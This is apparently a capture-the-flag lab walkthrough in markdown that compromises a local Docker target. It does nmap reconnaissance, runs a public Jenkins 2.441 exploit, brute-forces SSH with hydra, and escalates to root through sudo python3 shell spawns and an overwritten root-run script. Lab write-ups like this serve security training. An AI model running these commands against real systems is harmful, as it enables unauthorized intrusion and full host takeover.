![image](https://github.com/user-attachments/assets/0cb3d581-c87a-416d-b473-93d195490f87)


```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/b92223b9-e47a-47c2-a3cb-d60f3daa2a97)

## **We have a web page running on port 8080**

![image](https://github.com/user-attachments/assets/b723c382-958a-48ed-8433-c8e350fc7320)

## **Researching the web**
```bash
whatweb http://172.17.0.2:8080
```
![image](https://github.com/user-attachments/assets/01227e0c-8480-4b17-8c5c-6cab5025b306)

## **We search for possible vulnerabilities and exploits**
```bash
searchsploit jenkins 2.441
```
![image](https://github.com/user-attachments/assets/9b1413f6-8369-4d9d-b86e-4f956da458fa)

## **We bring to our working folder for further exploitation**
```bash
❯ locate java/webapps/51993.py
/usr/share/exploitdb/exploits/java/webapps/51993.py
❯ mv /usr/share/exploitdb/exploits/java/webapps/51993.py .
❯ ls
 51993.py
```
## **we run exploit**
``` bash
python3 51993.py -u http://172.17.0.2:8080
```
![image](https://github.com/user-attachments/assets/fa4e8b44-0c3c-4a55-822c-ab9c1a462b2e)

## **We will apply a brute force attack with hydra on port 22 with the user that we find**
```bash
hydra -l bobby -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![image](https://github.com/user-attachments/assets/3499650a-5ae9-43ca-ad4c-c89cb8ae7931)

## **Now we will log in via ssh**
```bash
ssh bobby@172.17.0.2
```
![image](https://github.com/user-attachments/assets/2293eb00-7d0e-4e22-8dfd-a3b1485fe7fe)

## **Once inside it's time to escalate privileges**
```bash
sudo -l
```
![image](https://github.com/user-attachments/assets/682b3ea1-0c6c-42f1-99d1-1e630f08d146)
![image](https://github.com/user-attachments/assets/33ce0d41-31af-49dd-8980-8d552bd1441b)

## **Treatment of tty**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## **As we saw in the previous step only the user pinguinito can use the python3 command at root level so let's try to change user**
```bash
sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
![image](https://github.com/user-attachments/assets/3e3053ac-29f7-4565-aa28-e79532b1811b)
## **Treatment of tty**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## **Once inside it's time to escalate privileges**
```bash
sudo -l
```
![image](https://github.com/user-attachments/assets/0acfea2b-b7ff-45f0-8c93-9a9fec46d86d)

## **we are going to view the file in question**
```bash
cd /opt
ls -la
```
![image](https://github.com/user-attachments/assets/9c44abcb-7c88-4ebf-9d0f-0f51b92310df)

## **We do not have write permissions**
```bash
chmod +w /opt/script.py
```
![image](https://github.com/user-attachments/assets/ac3b9578-615f-46c4-95b0-14e2fb68e03c)

## **Now we can edit the script. we are going to write in the file a code that will allow us to get a shell as root: we will use echo to edit the file since we don't have any text editor. First we run:**
```bash
echo 'import os' > script.py
```
## **And then:**
```bash
echo 'os.system("/bin/sh")' >> script.py
```
## **Then we do a cat to the file to see if the changes were made correctly**
```bash
cat script.py
```
![image](https://github.com/user-attachments/assets/cfaebea9-592f-422e-8c53-d01be22311d3)

## **Let's run the script with the following command to see if it worked correctly:**
```bash
sudo /usr/bin/python3 /opt/script.py
```
![image](https://github.com/user-attachments/assets/7e8e5e6b-9afe-4bfa-b14b-776fdfe2fdae)







